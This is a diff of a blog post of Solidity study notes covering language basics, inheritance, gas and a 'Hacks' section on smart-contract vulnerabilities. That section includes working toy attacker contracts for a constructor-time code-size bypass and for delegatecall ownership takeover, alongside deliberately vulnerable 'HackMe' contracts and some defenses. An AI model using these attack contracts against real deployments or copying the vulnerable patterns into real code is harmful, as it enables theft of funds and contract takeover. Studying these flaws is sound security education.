@@ -79,7 +79,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      2 min read
+      10 min read
     
 </span></p>
 
@@ -110,8 +110,21 @@ window.onload = wrap_img;
     <ul id="toc" class="section-nav">
 <li class="toc-entry toc-h2"><a href="#general">General</a></li>
 <li class="toc-entry toc-h2"><a href="#constant-vs-immutable">Constant vs Immutable</a></li>
+<li class="toc-entry toc-h2"><a href="#inheritence">Inheritence</a></li>
+<li class="toc-entry toc-h2"><a href="#shadowing-inherited-state-variables">Shadowing Inherited State Variables</a></li>
 <li class="toc-entry toc-h2"><a href="#wei-and-ethere">Wei and Ethere</a></li>
 <li class="toc-entry toc-h2"><a href="#gas">Gas</a></li>
+<li class="toc-entry toc-h1"><a href="#hacks">Hacks</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#bypass-contracrt-code-size-check">Bypass contracrt code size check</a></li>
+<li class="toc-entry toc-h2"><a href="#signature-replay-attack">Signature Replay Attack</a></li>
+<li class="toc-entry toc-h2"><a href="#blocktimestamp-manipulation">block.timestamp manipulation</a></li>
+<li class="toc-entry toc-h2"><a href="#front-running">Front Running</a></li>
+<li class="toc-entry toc-h2"><a href="#hiding-malicious-code-with-external-contracts">Hiding malicious code with external contracts</a></li>
+<li class="toc-entry toc-h2"><a href="#phishing-with-txnorigin">Phishing with txn.origin</a></li>
+<li class="toc-entry toc-h2"><a href="#delegatecalls">delegatecalls</a></li>
+</ul>
+</li>
 </ul><h2 id="general">
 <a class="anchor" href="#general" aria-hidden="true"><span class="octicon octicon-link"></span></a>General</h2>
 
@@ -170,6 +183,99 @@ window.onload = wrap_img;
 // in different files where the enums are to be used.
 </span></code></pre></div></div>
 
+<ol>
+  <li>
+    <p>A maximum of three parameters can be indexed in an event. Indexing helps to sort the given parameter while filtering the logs.</p>
+  </li>
+  <li>
+    <p>To call the parent contracts, either do <code class="language-plaintext highlighter-rouge">parentContract.foo()</code> or use the <code class="language-plaintext highlighter-rouge">super</code> keyword.</p>
+  </li>
+</ol>
+
+<p>Using <code class="language-plaintext highlighter-rouge">super</code> would call all of the immediate parent contracts.</p>
+
+<ol>
+  <li>Interfaces have no state variables, no constructors and no function implementations</li>
+</ol>
+
+<p>All functions have to be external and interfaces can inherit.</p>
+
+<p>You can name your function parameters. Like <code class="language-plaintext highlighter-rouge">address owner</code> instead of <code class="language-plaintext highlighter-rouge">address</code>.</p>
+
+<ol>
+  <li>The recommended method for sending Ether is <code class="language-plaintext highlighter-rouge">call</code> in combination with <code class="language-plaintext highlighter-rouge">re-entrancy guard</code>.</li>
+</ol>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/*
+    Which function is called, fallback() or receive()?
+
+           send Ether
+               |
+         msg.data is empty?
+              / \
+            yes  no
+            /     \
+receive() exists?  fallback()
+         /   \
+        yes   no
+        /      \
+    receive()   fallback()
+    */</span>
+
+<span class="n">_to</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+
+<span class="kt">bool</span> <span class="n">sent</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">send</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+
+<span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>Also, fallback function cannot take any arguments and cannot return anything.</p>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">fallback</code> is called when a function that does not exist is called or some Ether is sent without msg.data or recieve function does not exist.</p>
+  </li>
+  <li>
+    <p>Calling other functions with the low-level <code class="language-plaintext highlighter-rouge">call</code></p>
+  </li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000}(abi.encodeWithSignature("foo(string,uint256)", "call foo", 123));
+</code></pre></div></div>
+
+<ol>
+  <li>
+<code class="language-plaintext highlighter-rouge">delegatecall</code> is similar to <code class="language-plaintext highlighter-rouge">call</code> but the difference is if contract A delegates a call to contract B, then the function code of contract B is executed with the storage, msg.sender and msg.value of contract A itself.</li>
+</ol>
+
+<p>13.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+function transfer(address _addr, uint256 _amt) {
+    // something
+}
+
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+abi.encodeWithSignature("transfer(address,uint256)");
+
+</code></pre></div></div>
+
+<p>and</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+bytes4 public transferSelector = bytes4(keccak256(bytes4("transfer(address,uint256)")));
+
+</code></pre></div></div>
+
+<p>Same energy</p>
+
+<ol>
+  <li>
+</ol>
+
 <h2 id="constant-vs-immutable">
 <a class="anchor" href="#constant-vs-immutable" aria-hidden="true"><span class="octicon octicon-link"></span></a>Constant vs Immutable</h2>
 
@@ -213,6 +319,42 @@ This will get reevaluated to the exact value at time of pasting the value of PI 
 
 <p>-&gt; Due to this, constant values can sometimes be cheaper than immutable values.</p>
 
+<h2 id="inheritence">
+<a class="anchor" href="#inheritence" aria-hidden="true"><span class="octicon octicon-link"></span></a>Inheritence</h2>
+
+<ol>
+  <li>
+    <p>Function that is going to be overriden, must be declared as <code class="language-plaintext highlighter-rouge">virtual</code> and the function that will override a parent function must use the keyword <code class="language-plaintext highlighter-rouge">override</code></p>
+  </li>
+  <li>
+    <p>The order of inheritence in a new contract should go from <em>most-base-like</em> to <em>most-derived</em>.</p>
+  </li>
+  <li>
+    <p>Contracts can inherit from multiple parent contracts. When a function is called that is defined multiple times in different contracts, parent contracts are searched from right to left, and in depth-first manner.</p>
+  </li>
+</ol>
+
+<h2 id="shadowing-inherited-state-variables">
+<a class="anchor" href="#shadowing-inherited-state-variables" aria-hidden="true"><span class="octicon octicon-link"></span></a>Shadowing Inherited State Variables</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">contract</span> <span class="n">Parent</span> <span class="p">{</span>
+    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">pi</span> <span class="o">=</span> <span class="mi">314</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">Child</span> <span class="k">is</span> <span class="n">Parent</span> <span class="p">{</span>
+
+    <span class="c1">// uint256 public pi = 31419; // Would fail
+</span>    <span class="c1">// pi = 314159; // Would also fail
+</span>
+    <span class="k">constructor</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">pi</span> <span class="o">=</span> <span class="mi">314159</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
+
 <h2 id="wei-and-ethere">
 <a class="anchor" href="#wei-and-ethere" aria-hidden="true"><span class="octicon octicon-link"></span></a>Wei and Ethere</h2>
 
@@ -235,6 +377,290 @@ This will get reevaluated to the exact value at time of pasting the value of PI 
   <li>gas limit (that is set by you, ie the maximum gas you are willing to pay for a particular transaction)</li>
 </ol>
 
+<h1 id="hacks">
+<a class="anchor" href="#hacks" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hacks</h1>
+
+<h2 id="bypass-contracrt-code-size-check">
+<a class="anchor" href="#bypass-contracrt-code-size-check" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bypass contracrt code size check</h2>
+
+<p>If a contract implements a function to check the code-size of a particular address, it will write a function similar to this:</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">isContract</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint32</span> <span class="n">codeSize</span><span class="p">;</span>
+    <span class="k">assembly</span> <span class="p">{</span>
+        <span class="n">codeSize</span> <span class="o">:=</span> <span class="n">extcodesize</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">codeSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>But if this function is called by a contract from its constructor, we can bypass this check. Consider this example:</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">contract</span> <span class="n">Attacker</span> <span class="p">{</span>
+    <span class="kt">bool</span> <span class="k">public</span> <span class="n">isContract</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_target</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">isContract</span> <span class="o">=</span> <span class="n">Target</span><span class="p">(</span><span class="n">_target</span><span class="p">).</span><span class="n">isContract</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">isContract</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h2 id="signature-replay-attack">
+<a class="anchor" href="#signature-replay-attack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Signature Replay Attack</h2>
+
+<p>Signing messages off chain and then having a contract that requires that signature before executing a function is a useful technique.</p>
+
+<p>Vulnerability is that the same signature can be used again and again to execute a function.</p>
+
+<p>The ECDSA or the Elliptic Curve Digital Signature Algorithm signatures can be recovered or managed using the ECDSA utility of OZ.
+These are often generated using the <code class="language-plaintext highlighter-rouge">web3.eth.sign</code> function and are 65 byte array (of type bytes in Solidity) arranged in the following way:
+[[v(1)],[r(32)],[s(32)]]
+The data signer can be recovered with ECDSA.</p>
+
+<p>The following code snippet shows how to prevent the signature replay attack:</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">//SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">14</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="s">"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">ReplayAttack</span> <span class="p">{</span>
+    <span class="k">using</span> <span class="n">ECDSA</span> <span class="k">for</span> <span class="kt">bytes32</span><span class="p">;</span>
+
+    <span class="kt">address</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">public</span> <span class="n">owners</span><span class="p">;</span>
+    <span class="k">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">public</span> <span class="n">executed</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">memory</span> <span class="n">_owners</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="n">owners</span> <span class="o">=</span> <span class="n">_owners</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+
+    <span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_nonce</span><span class="p">,</span> <span class="kt">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">memory</span> <span class="n">_sigs</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="kt">bytes32</span> <span class="n">txHash</span> <span class="o">=</span> <span class="n">getTxHash</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">,</span> <span class="n">_nonce</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">executed</span><span class="p">[</span><span class="n">txHash</span><span class="p">],</span> <span class="s">"Already Executed"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">_checkSigs</span><span class="p">(</span><span class="n">_sigs</span><span class="p">,</span> <span class="n">txHash</span><span class="p">),</span> <span class="s">"invalid sigs"</span><span class="p">);</span>
+
+        <span class="n">executed</span><span class="p">[</span><span class="n">txHash</span><span class="p">]</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+
+        <span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">sent</span><span class="p">,</span> <span class="s">"Failed to send Ether"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">getTxHash</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_nonce</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">,</span> <span class="n">_nonce</span><span class="p">)));</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">_checkSigs</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">memory</span> <span class="n">_sigs</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_txHash</span><span class="p">)</span> <span class="k">private</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">bytes32</span> <span class="n">ethSignedHash</span> <span class="o">=</span> <span class="n">_txHash</span><span class="p">.</span><span class="n">toEthSignedMessageHash</span><span class="p">();</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_sigs</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kt">address</span> <span class="n">signer</span> <span class="o">=</span> <span class="n">ethSignedHash</span><span class="p">.</span><span class="n">recover</span><span class="p">(</span><span class="n">_sigs</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="kt">bool</span> <span class="n">valid</span> <span class="o">=</span> <span class="n">signer</span> <span class="o">==</span> <span class="n">owners</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">valid</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h2 id="blocktimestamp-manipulation">
+<a class="anchor" href="#blocktimestamp-manipulation" aria-hidden="true"><span class="octicon octicon-link"></span></a>block.timestamp manipulation</h2>
+
+<p>Don’t use block.timestamp as a source of entropy and/or random number.</p>
+
+<p>The miners can manipulate the block.timestamp with the following two constraints:</p>
+
+<ol>
+  <li>Block cannot be stamped with a time earlier than it’s parent</li>
+  <li>Cannot be too far out in the future.</li>
+</ol>
+
+<h2 id="front-running">
+<a class="anchor" href="#front-running" aria-hidden="true"><span class="octicon octicon-link"></span></a>Front Running</h2>
+
+<p>Transactions take some time before they are mined.</p>
+
+<p>Transactions not yet mined are put in a transaction pool.</p>
+
+<p>Since transactions with a higher gas price are typically mined first, an attacker who might be watching the mempool, may spot an opportunity to get their own txn included in a block before someone else (might be winning a game, swapping a highly illiquid asset etc) and get significant economical incentives.</p>
+
+<p>Solution:</p>
+
+<ol>
+  <li>Use the commit-reveal-distribute scheme when games are involved.</li>
+  <li>Use submarine send.</li>
+</ol>
+
+<h2 id="hiding-malicious-code-with-external-contracts">
+<a class="anchor" href="#hiding-malicious-code-with-external-contracts" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hiding malicious code with external contracts</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">A</span> <span class="p">{</span>
+    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">testVar</span><span class="p">;</span> <span class="c1">// public will create an automatic getter function
+</span><span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">B</span> <span class="p">{</span>
+    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">testVar</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> 
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">ProblematicTypecasting</span> <span class="p">{</span>
+    <span class="k">function</span> <span class="n">viewTestVar</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">A</span><span class="p">(</span><span class="n">_addr</span><span class="p">).</span><span class="n">testVar</span><span class="p">();</span>
+        <span class="c1">// Will return 0 or 10 based on whether we pass the deployed address of contract A or B.
+</span>    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h2 id="phishing-with-txnorigin">
+<a class="anchor" href="#phishing-with-txnorigin" aria-hidden="true"><span class="octicon octicon-link"></span></a>Phishing with txn.origin</h2>
+
+<p>Use msg.sender</p>
+
+<h2 id="delegatecalls">
+<a class="anchor" href="#delegatecalls" aria-hidden="true"><span class="octicon octicon-link"></span></a>delegatecalls</h2>
+
+<p>delegatecalls preserves context</p>
+
+<p>example:</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">What</span> <span class="n">happened</span><span class="o">?</span>
+<span class="n">Eve</span> <span class="n">called</span> <span class="n">Attack</span><span class="p">.</span><span class="n">attack</span><span class="p">().</span>
+<span class="n">Attack</span> <span class="n">called</span> <span class="n">the</span> <span class="k">fallback</span> <span class="k">function</span> <span class="kr">of</span> <span class="n">HackMe</span> <span class="n">sending</span> <span class="n">the</span> <span class="k">function</span>
+<span class="nb">selector</span> <span class="kr">of</span> <span class="n">pwn</span><span class="p">().</span> <span class="n">HackMe</span> <span class="n">forwards</span> <span class="n">the</span> <span class="nb">call</span> <span class="n">to</span> <span class="n">Lib</span> <span class="k">using</span> <span class="nb">delegatecall</span><span class="p">.</span>
+<span class="n">Here</span> <span class="n">msg</span><span class="p">.</span><span class="n">data</span> <span class="n">contains</span> <span class="n">the</span> <span class="k">function</span> <span class="nb">selector</span> <span class="kr">of</span> <span class="n">pwn</span><span class="p">().</span>
+<span class="n">This</span> <span class="n">tells</span> <span class="n">Solidity</span> <span class="n">to</span> <span class="nb">call</span> <span class="n">the</span> <span class="k">function</span> <span class="n">pwn</span><span class="p">()</span> <span class="n">inside</span> <span class="n">Lib</span><span class="p">.</span>
+<span class="n">The</span> <span class="k">function</span> <span class="n">pwn</span><span class="p">()</span> <span class="n">updates</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">to</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span>
+<span class="n">Delegatecall</span> <span class="n">runs</span> <span class="n">the</span> <span class="n">code</span> <span class="kr">of</span> <span class="n">Lib</span> <span class="k">using</span> <span class="n">the</span> <span class="n">context</span> <span class="kr">of</span> <span class="n">HackMe</span><span class="p">.</span>
+<span class="n">Therefore</span> <span class="n">HackMe</span><span class="s">'s storage was updated to msg.sender where msg.sender is the</span><span class="err">
+</span><span class="s">caller of HackMe, in this case Attack.</span><span class="err">
+</span><span class="s">*/</span><span class="err">
+
+</span><span class="s">contract Lib {</span><span class="err">
+</span><span class="s">    address public owner;</span><span class="err">
+
+</span><span class="s">    function pwn() public {</span><span class="err">
+</span><span class="s">        owner = msg.sender;</span><span class="err">
+</span><span class="s">    }</span><span class="err">
+</span><span class="s">}</span><span class="err">
+
+</span><span class="s">contract HackMe {</span><span class="err">
+</span><span class="s">    address public owner;</span><span class="err">
+</span><span class="s">    Lib public lib;</span><span class="err">
+
+</span><span class="s">    constructor(Lib _lib) {</span><span class="err">
+</span><span class="s">        owner = msg.sender;</span><span class="err">
+</span><span class="s">        lib = Lib(_lib);</span><span class="err">
+</span><span class="s">    }</span><span class="err">
+
+</span><span class="s">    fallback() external payable {</span><span class="err">
+</span><span class="s">        address(lib).delegatecall(msg.data);</span><span class="err">
+</span><span class="s">    }</span><span class="err">
+</span><span class="s">}</span><span class="err">
+
+</span><span class="s">contract Attack {</span><span class="err">
+</span><span class="s">    address public hackMe;</span><span class="err">
+
+</span><span class="s">    constructor(address _hackMe) {</span><span class="err">
+</span><span class="s">        hackMe = _hackMe;</span><span class="err">
+</span><span class="s">    }</span><span class="err">
+
+</span><span class="s">    function attack() public {</span><span class="err">
+</span><span class="s">        hackMe.call(abi.encodeWithSignature("pwn()"));</span><span class="err">
+</span><span class="s">    }</span><span class="err">
+</span><span class="s">}</span><span class="err">
+
+</span></code></pre></div></div>
+
+<p>Another slightly more sophisticated example</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="cm">/*
+This is a more sophisticated version of the previous exploit.
+
+1. Alice deploys Lib and HackMe with the address of Lib
+2. Eve deploys Attack with the address of HackMe
+3. Eve calls Attack.attack()
+4. Attack is now the owner of HackMe
+
+What happened?
+Notice that the state variables are not defined in the same manner in Lib
+and HackMe. This means that calling Lib.doSomething() will change the first
+state variable inside HackMe, which happens to be the address of lib.
+
+Inside attack(), the first call to doSomething() changes the address of lib
+store in HackMe. Address of lib is now set to Attack.
+The second call to doSomething() calls Attack.doSomething() and here we
+change the owner.
+*/</span>
+
+<span class="k">contract</span> <span class="n">Lib</span> <span class="p">{</span>
+    <span class="kt">uint</span> <span class="k">public</span> <span class="n">someNumber</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="n">doSomething</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_num</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">someNumber</span> <span class="o">=</span> <span class="n">_num</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">HackMe</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">lib</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+    <span class="kt">uint</span> <span class="k">public</span> <span class="n">someNumber</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_lib</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">lib</span> <span class="o">=</span> <span class="n">_lib</span><span class="p">;</span>
+        <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">doSomething</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_num</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">lib</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"doSomething(uint256)"</span><span class="p">,</span> <span class="n">_num</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">Attack</span> <span class="p">{</span>
+    <span class="c1">// Make sure the storage layout is the same as HackMe
+</span>    <span class="c1">// This will allow us to correctly update the state variables
+</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">lib</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+    <span class="kt">uint</span> <span class="k">public</span> <span class="n">someNumber</span><span class="p">;</span>
+
+    <span class="n">HackMe</span> <span class="k">public</span> <span class="n">hackMe</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="n">HackMe</span> <span class="n">_hackMe</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">hackMe</span> <span class="o">=</span> <span class="n">HackMe</span><span class="p">(</span><span class="n">_hackMe</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="c1">// override address of lib
+</span>        <span class="n">hackMe</span><span class="p">.</span><span class="n">doSomething</span><span class="p">(</span><span class="kt">uint</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))));</span>
+        <span class="c1">// pass any number as input, the function doSomething() below will
+</span>        <span class="c1">// be called
+</span>        <span class="n">hackMe</span><span class="p">.</span><span class="n">doSomething</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// function signature must match HackMe.doSomething()
+</span>    <span class="k">function</span> <span class="n">doSomething</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_num</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
 
   </div><a class="u-url" href="/web3/solidity/solidity-by-example/language-tricks/beginner/2022/03/09/Mental-Hooks-SBE.html" hidden></a>
 </article>
